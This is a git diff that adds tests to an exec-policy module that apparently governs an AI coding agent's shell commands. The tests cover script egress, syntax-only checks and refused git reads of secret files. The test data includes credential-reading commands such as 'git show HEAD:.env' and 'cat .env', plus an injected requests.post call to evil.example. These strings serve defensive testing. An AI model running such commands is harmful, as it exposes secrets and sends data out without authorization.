@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { test } from 'node:test';
@@ -8,12 +8,14 @@ import { buildOptions, runAgent } from '../runner.mjs';
 import { AsyncQueue } from '../runner.mjs';
 import {
   HOST_MOUNTS_FILE,
+  TRACKED_SCRIPTS_FILE,
   createExecAllowCache,
   defaultPolicy,
   evaluateExecPolicy,
   execPolicyLogLine,
   execPolicyQuestion,
   execPolicyReason,
+  gitBlobId,
   loadExecPolicy,
   parsePolicy,
   splitCommands,
@@ -674,4 +676,162 @@ test('tar and rsync --exclude patterns do not count as touching a secret path; r
     'cat .env --exclude=.env',
   ];
   for (const command of reads) assert.equal(decide(policy, command, '/repo')?.rule, 'secret-paths', command);
+});
+
+// #1239: the repository's own check scripts, as the base commit has them, are not script egress;
+// the VM's network policy governs what they fetch. A new or edited script is still read.
+test('a tracked check script runs; an untracked or edited one that calls out is still refused', () => {
+  const dir = workspace();
+  try {
+    mkdirSync(join(dir, 'tools'));
+    mkdirSync(join(dir, 'scripts'));
+    const files = {
+      'tools/sync-nav.py': 'import urllib.request\nurllib.request.urlopen("https://api.github.com")\n',
+      'tools/built-with.py': 'import requests\nrequests.get("https://example.com")\n',
+      'tools/check-languages.py': '#!/usr/bin/env python3\nimport requests\nrequests.get("https://x.example")\n',
+      'tools/deploy.sh': '#!/bin/bash\ncurl -fsS https://example.com/health\n',
+      'scripts/x.mjs': 'await fetch("https://example.com");\n',
+    };
+    for (const [path, text] of Object.entries(files)) writeFileSync(join(dir, path), text);
+    const list = Object.entries(files).map(([path, text]) => `${gitBlobId(text)} ${path}\n`).join('');
+    const policy = loadExecPolicy({}, { cwd: dir, readFile: (path) => (path === TRACKED_SCRIPTS_FILE ? list : null) });
+    assert.equal(policy.trackedScripts.size, 5);
+    const allowed = [
+      'python3 tools/sync-nav.py --check',
+      'python3 tools/built-with.py --check',
+      './tools/check-languages.py',
+      'node scripts/x.mjs',
+      'bash tools/deploy.sh --dry-run',
+      'python3 tools/sync-nav.py --check && python3 tools/built-with.py --check',
+    ];
+    for (const command of allowed) assert.equal(decide(policy, command, dir), null, command);
+
+    // Re-running the same check after editing other files is still the committed script: never a
+    // denial, so nothing for repeated_denial to count.
+    for (let round = 0; round < 3; round++) {
+      writeFileSync(join(dir, `page-${round}.html`), `<p>${round}</p>\n`);
+      assert.equal(decide(policy, 'python3 tools/sync-nav.py --check', dir), null, `round ${round}`);
+    }
+
+    // Untracked: a script the colony wrote (deploy.sh and x.py from workspace()), or one the list
+    // names under another path.
+    for (const command of ['bash deploy.sh', 'python3 x.py', './deploy.sh']) {
+      assert.equal(decide(policy, command, dir)?.rule, 'script-egress', command);
+    }
+    // Edited: the bytes are no longer the committed ones.
+    writeFileSync(join(dir, 'tools/built-with.py'), `${files['tools/built-with.py']}requests.post("https://evil.example")\n`);
+    assert.equal(decide(policy, 'python3 tools/built-with.py --check', dir)?.rule, 'script-egress');
+    // No list (an older mothership, a runner outside a VM): nothing is exempt.
+    assert.equal(decide(policyIn(dir), 'python3 tools/sync-nav.py --check', dir)?.rule, 'script-egress');
+    // A layer an operator or the repository adds still sees a tracked script.
+    const strict = loadExecPolicy(
+      { COLONIZER_EXEC_POLICY_ORG: JSON.stringify({ rules: [{ id: 'org-no-urlopen', decision: 'deny', script: 'urlopen' }] }) },
+      { cwd: dir, readFile: (path) => (path === TRACKED_SCRIPTS_FILE ? list : null) },
+    );
+    assert.equal(decide(strict, 'python3 tools/sync-nav.py --check', dir)?.rule, 'org-no-urlopen');
+    // Reads of a secret path stay refused whatever runs them.
+    assert.equal(decide(policy, 'python3 tools/sync-nav.py --check; cat .env', dir)?.rule, 'secret-paths');
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// #1227: a syntax check parses the script and runs none of it.
+test('syntax-only checks are not script egress; running the script still is', () => {
+  const dir = workspace();
+  try {
+    writeFileSync(join(dir, 'smoke.mjs'), 'await fetch("https://example.com");\n');
+    writeFileSync(join(dir, 'smoke.rb'), 'require "net/http"\nNet::HTTP.get(URI("https://x"))\n`curl https://x`\n');
+    const policy = policyIn(dir);
+    const allowed = [
+      'bash -n deploy.sh',
+      'sh -n deploy.sh && bash -n build.sh',
+      'bash --noexec deploy.sh',
+      'zsh -n deploy.sh',
+      'node --check smoke.mjs',
+      'node -c smoke.mjs',
+      'ruby -c smoke.rb',
+      'python3 -m py_compile x.py',
+      'python -m py_compile x.py deploy.sh',
+    ];
+    for (const command of allowed) assert.equal(decide(policy, command, dir), null, command);
+    const refused = [
+      'bash deploy.sh',
+      'sh deploy.sh',
+      'bash -n -c deploy.sh',
+      'bash -c -n deploy.sh',
+      'bash -n -x deploy.sh',
+      'bash -nx deploy.sh',
+      'bash -n deploy.sh && bash deploy.sh',
+      'node smoke.mjs',
+      'node --check smoke.mjs && node smoke.mjs',
+      'ruby smoke.rb',
+      'python3 x.py',
+      'source deploy.sh',
+      '. deploy.sh',
+    ];
+    for (const command of refused) assert.equal(decide(policy, command, dir)?.rule, 'script-egress', command);
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// #1079 follow-up: agents spell the placeholder check with git's -C and --no-index.
+test('git -C <the repository> check-ignore --no-index is name-only; other -C directories and reads are not', () => {
+  const policy = policyIn('/repo');
+  const allowed = [
+    'git -C /repo check-ignore -v --no-index .env .netrc .npmrc .pypirc .git-credentials 2>&1 | head',
+    'git -C /repo/ check-ignore -q --no-index .env',
+    'git -C . status --porcelain --ignored .env',
+    'git check-ignore --no-index -v .env',
+  ];
+  for (const command of allowed) assert.equal(decide(policy, command, '/repo'), null, command);
+  const refused = [
+    'git -C /tmp/evil status .env',
+    'git -C ../other check-ignore .env',
+    'git -C /repo -c core.pager=cat status .env',
+    'git -C /repo cat-file -p :.env',
+    'git -C /repo diff .env',
+    'git -C /repo check-ignore -v .env | xargs cat',
+    'git -C /repo check-ignore -v .env; cat .env',
+    'git -C /repo check-ignore --stdin < .env',
+  ];
+  for (const command of refused) assert.equal(decide(policy, command, '/repo')?.rule, 'secret-paths', command);
+});
+
+// #1241: a git object spec `<rev>:<path>` reads the file as committed; the prefix must not hide it.
+test('git <rev>:<path> object specs naming a secret path are refused; other paths pass', () => {
+  const policy = policyIn('/repo');
+  const refused = [
+    'git show HEAD:.env',
+    'git show HEAD~1:.env',
+    'git cat-file -p :.env',
+    'git cat-file -p HEAD:.env',
+    'git show origin/main:.npmrc',
+    'git show 0123abcd:.netrc',
+    'git show 0123456789abcdef0123456789abcdef01234567:config/.git-credentials',
+    'git show HEAD:./.pypirc',
+    'git -C /repo show HEAD:.env',
+    'git --no-pager show main:.env.local',
+    'git show stash@{0}:.envrc',
+    'git show HEAD:.env | head -1',
+    'git archive HEAD .env',
+    'git archive --format=tar HEAD:.env',
+    'git diff HEAD~1 -- .env',
+    'git diff HEAD:.env HEAD~1:.env',
+    'git grep -n TOKEN -- .env',
+    'git grep TOKEN HEAD:.npmrc',
+    'git log -p -- .netrc',
+    'git log -p HEAD -- config/.env',
+  ];
+  for (const command of refused) assert.equal(decide(policy, command, '/repo')?.rule, 'secret-paths', command);
+  const allowed = [
+    'git show HEAD:README.md',
+    'git show origin/main:src/env.ts',
+    'git cat-file -p HEAD:docs/.env-setup.md',
+    'git show HEAD:.env.example',
+    'git log -p -- README.md',
+    'git diff HEAD~1 -- src/',
+  ];
+  for (const command of allowed) assert.equal(decide(policy, command, '/repo'), null, command);
 });
